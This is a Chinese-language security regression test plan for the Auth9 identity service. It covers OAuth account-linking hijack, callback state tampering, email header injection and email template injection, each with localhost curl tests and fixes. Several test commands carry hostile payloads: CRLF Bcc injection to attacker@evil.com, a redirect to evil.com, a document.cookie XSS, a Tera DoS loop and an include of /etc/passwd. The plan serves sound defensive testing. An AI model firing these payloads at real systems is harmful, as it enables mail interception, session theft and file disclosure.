# 认证安全 - 身份提供商与邮件安全测试

**模块**: 认证安全
**测试范围**: Identity Provider 安全、账户关联、邮件注入
**场景数**: 4
**风险等级**: 🟠 高
**ASVS 5.0 矩阵ID**: M-AUTH-05
**OWASP ASVS 5.0**: V10.5,V10.6,V6.4
**回归任务映射**: Backlog #4, #20


---

## 背景知识

Auth9 支持多种登录方式：
- **Auth9 本地认证**: 用户名/密码（Auth9 OIDC Engine）
- **社交登录 (IdP)**: Google, GitHub 等（通过 Auth9 Identity Brokering）
- **账户关联**: `linked_identities` 表存储 `(user_id, provider, provider_user_id)`

Auth9 也发送多种邮件通知：
- 密码重置邮件
- 密码更改确认
- 邀请邮件
- 安全告警通知

---

## 场景 1：OAuth 账户关联劫持

### 前置条件
- 系统配置了至少一个社交登录 IdP
- 两个测试用户账户

### 攻击目标
验证攻击者是否可以通过伪造 OAuth 回调将自己的社交账户关联到受害者的 Auth9 账户

### 攻击步骤
1. 受害者使用邮箱 victim@example.com 注册并关联 Google 账户
2. 攻击者控制 GitHub 账户，邮箱设为 victim@example.com
3. 攻击者通过 GitHub 登录 Auth9
4. 检查系统是否基于邮箱自动将 GitHub 关联到受害者账户
5. 尝试通过 API 直接关联身份到其他用户
6. 测试 provider_user_id 冲突处理

### 预期安全行为
- 新 IdP 登录时，不基于邮箱自动关联已有账户
- 账户关联需要用户已登录状态下主动操作
- 不同 IdP 的 user_id 不会冲突
- 邮箱匹配时提示用户手动关联而非自动关联

### 验证方法
```bash
# 检查 linked_identities 表结构
# SELECT * FROM linked_identities WHERE user_id = 'victim-user-id';
# 确认每条记录包含 provider, provider_user_id

# 模拟 GitHub 登录（使用与已有用户相同邮箱）
# 1. 通过 Auth9 GitHub IdP broker 登录
# 2. Auth9 收到 GitHub 用户信息（邮箱相同）
# 3. 检查 Auth9 的处理逻辑

# 通过 API 尝试直接关联
curl -X POST -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/users/$VICTIM_ID/identities \
  -d '{"provider": "github", "provider_user_id": "attacker-github-id"}'
# 预期: 403 - Cannot link identity to another user

# 检查现有关联
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/api/v1/users/me/identities
# 预期: 仅显示当前用户的关联

# 验证 provider + provider_user_id 唯一约束
# 尝试将同一 GitHub 账户关联到两个不同用户
# 预期: 409 Conflict
```

### 修复建议
- 社交登录首次使用时创建新账户，不自动关联
- 账户关联需在已认证会话中由用户主动发起
- 关联前验证当前用户身份（二次确认）
- `linked_identities` 表 `(provider, provider_user_id)` 唯一约束
- 仅 `email_verified: true` 的 IdP 邮箱可用于匹配建议

---

## 场景 2：OAuth 回调参数篡改

### 前置条件
- 社交登录流程正常工作
- 能够拦截 OAuth 回调

### 攻击目标
验证 OAuth 回调中的参数是否可被篡改以获取未授权访问

### 攻击步骤
1. 发起社交登录流程
2. 截获回调 URL 中的 `code` 和 `state` 参数
3. 尝试修改 `state` 参数中的 JSON 数据（client_id, redirect_uri 等）
4. 尝试使用其他用户的 OAuth code
5. 尝试在回调中注入额外参数

### 预期安全行为
- state 参数经过签名或加密，篡改被检测
- OAuth code 绑定到特定客户端和回调地址
- 额外参数被忽略
- 篡改的 state 返回错误

### 验证方法
```bash
# 获取正常的回调 URL
# 通过浏览器发起社交登录，截获回调

# 解码 state 参数
echo "$STATE" | base64 -d
# 查看 state 结构: {"redirect_uri": "...", "client_id": "...", "original_state": "..."}

# 篡改 state 中的 redirect_uri
TAMPERED_STATE=$(echo '{"redirect_uri":"http://evil.com","client_id":"auth9-portal","original_state":"xxx"}' | base64)
curl -v "http://localhost:8080/api/v1/auth/callback?code=$CODE&state=$TAMPERED_STATE"
# 预期: 400 - Invalid state

# 篡改 state 中的 client_id
TAMPERED_STATE2=$(echo '{"redirect_uri":"http://localhost:3000/callback","client_id":"admin-client","original_state":"xxx"}' | base64)
curl -v "http://localhost:8080/api/v1/auth/callback?code=$CODE&state=$TAMPERED_STATE2"
# 预期: 400 - Invalid state or client mismatch

# 使用过期 code
sleep 600  # 等待 10 分钟
curl -v "http://localhost:8080/api/v1/auth/callback?code=$OLD_CODE&state=$STATE"
# 预期: 400 - Code expired
```

### 修复建议
- state 参数使用 HMAC 签名，服务端验证完整性
- 或将 state 数据存储在服务端（Redis），仅传递 state ID
- OAuth code 使用后立即失效
- 回调参数严格白名单验证

---

## 场景 3：邮件头注入

### 前置条件
- 能够触发邮件发送（密码重置、邀请等）
- 用户可控的邮箱字段

### 攻击目标
验证邮件发送功能是否存在邮件头注入漏洞

### 攻击步骤
1. 在邮箱字段中注入邮件头：
   - `victim@test.com\r\nBcc: attacker@evil.com`
   - `victim@test.com\nCC: attacker@evil.com`
2. 在用户名字段中注入（可能出现在邮件正文中）：
   - `<script>alert('XSS')</script>`
   - `{{template_injection}}`
3. 请求密码重置到注入了额外收件人的地址
4. 检查攻击者是否收到邮件副本

### 预期安全行为
- 邮箱地址严格 RFC 5322 验证，不接受换行符
- 邮件头注入字符被过滤
- 用户可控内容在邮件正文中被转义
- 密码重置 Token 不发送到未验证的邮箱

### 验证方法
```bash
# 邮箱字段注入
curl -X POST http://localhost:8080/api/v1/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@test.com\r\nBcc: attacker@evil.com"}'
# 预期: 400 - Invalid email format

# 带换行的邮箱
curl -X POST http://localhost:8080/api/v1/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@test.com\nCC: attacker@evil.com"}'
# 预期: 400 - Invalid email format

# URL 编码注入
curl -X POST http://localhost:8080/api/v1/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@test.com%0ABcc:%20attacker@evil.com"}'
# 预期: 400

# 邀请邮件注入
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/invitations \
  -d '{"email": "test@test.com\r\nBcc: spy@evil.com", "role_ids": ["role-id"]}'
# 预期: 400 - Invalid email

# 用户名中的 XSS（影响邮件正文）
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/users/me \
  -d '{"name": "<script>alert(document.cookie)</script>"}'
# 然后触发包含用户名的邮件
# 预期: 邮件正文中 HTML 被转义
```

### 修复建议
- 邮箱验证使用严格正则，拒绝 `\r`, `\n`, `%0a`, `%0d`
- 使用邮件库的安全 API（如 `lettre` crate），不手动构造邮件头
- 邮件模板中的用户可控变量进行 HTML 转义
- 邮件发送记录审计日志

---

## 场景 4：邮件模板注入

### 前置条件
- 系统使用模板引擎渲染邮件
- 用户可控内容出现在邮件中

### 攻击目标
验证邮件模板是否存在服务端模板注入 (SSTI) 风险

### 攻击步骤
1. 在用户名字段设置模板语法：
   - Jinja2: `{{ 7*7 }}`
   - Handlebars: `{{constructor.constructor('return this')()}}`
   - Tera/Askama (Rust): `{{ config }}`
2. 触发包含用户名的邮件发送
3. 检查邮件内容中模板是否被执行
4. 如果执行，尝试读取敏感信息

### 预期安全行为
- 用户输入作为纯文本渲染，不被模板引擎解析
- 模板语法字符被转义
- 模板沙箱限制可访问的对象和方法
- 邮件模板预编译，用户数据通过变量传递

### 验证方法
```bash
# 设置用户名为模板语法
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/users/me \
  -d '{"name": "{{ 7 * 7 }}"}'

# 触发密码重置邮件（包含用户名）
curl -X POST http://localhost:8080/api/v1/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email": "test@test.com"}'

# 检查邮件内容
# 如果邮件中显示 "49" 而非 "{{ 7 * 7 }}"，则存在 SSTI
# 预期: 邮件中显示原始文本 "{{ 7 * 7 }}"

# Rust Tera 模板注入
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/users/me \
  -d '{"name": "{% for i in range(end=10000000) %}A{% endfor %}"}'
# 预期: 如果被执行，可能导致 DoS
# 安全行为: 不执行，作为纯文本

# 检查自定义邮件模板功能
# 如果管理员可以自定义邮件模板，验证模板编辑的安全性
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8080/api/v1/email-templates/password-reset \
  -d '{"body": "{% include \"/etc/passwd\" %}"}'
# 预期: 400 - Template validation failed 或 include 被禁用
```

### 修复建议
- 使用自动转义的模板引擎（Tera 的 `autoescape` 功能）
- 邮件模板中用户数据通过变量传递，禁止内联模板语法
- 自定义模板功能限制允许的模板指令（禁用 include, import）
- 模板渲染设置超时和输出大小限制
- 模板变更需要管理员审批

---

## 检查清单

| # | 场景 | 状态 | 测试日期 | 测试人员 | 发现问题 |
|---|------|------|----------|----------|----------|
| 1 | OAuth 账户关联劫持 | ☐ | | | |
| 2 | OAuth 回调参数篡改 | ☐ | | | |
| 3 | 邮件头注入 | ☐ | | | |
| 4 | 邮件模板注入 | ☐ | | | |

---

## 参考资料

- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [CWE-1336: Server-Side Template Injection](https://cwe.mitre.org/data/definitions/1336.html)
- [OWASP Email Header Injection](https://owasp.org/www-community/attacks/Email_Header_Injection)
- [Account Linking Attacks](https://www.ietf.org/archive/id/draft-ietf-oauth-security-topics-25.html#section-4.11)

---


---

## 标准化回归 Checklist（ASVS 5.0）

**矩阵ID**: M-AUTH-05  
**适用控制**: V10.5,V10.6,V6.4  
**关联任务**: Backlog #4, #20  
**建议回归频率**: 每次发布前 + 缺陷修复后必跑  
**场景总数**: 4

### 执行清单
- [ ] M-AUTH-05-C01 | 控制: V10.5 | 任务: #4, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-AUTH-05-C02 | 控制: V10.6 | 任务: #4, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-AUTH-05-C03 | 控制: V6.4 | 任务: #4, #20 | 动作: 执行文档内相关攻击步骤并记录证据

### 回归记录表
| 检查项ID | 执行结果(pass/fail) | 风险等级 | 证据（请求/响应/日志/截图） | 备注 |
|---|---|---|---|---|
|  |  |  |  |  |

### 退出准则
1. 所有检查项执行完成，且高风险项无 `fail`。
2. 如存在 `fail`，必须附带漏洞单号、修复计划和复测结论。
3. 回归报告需同时记录矩阵ID与 Backlog 任务号，便于跨版本追溯。
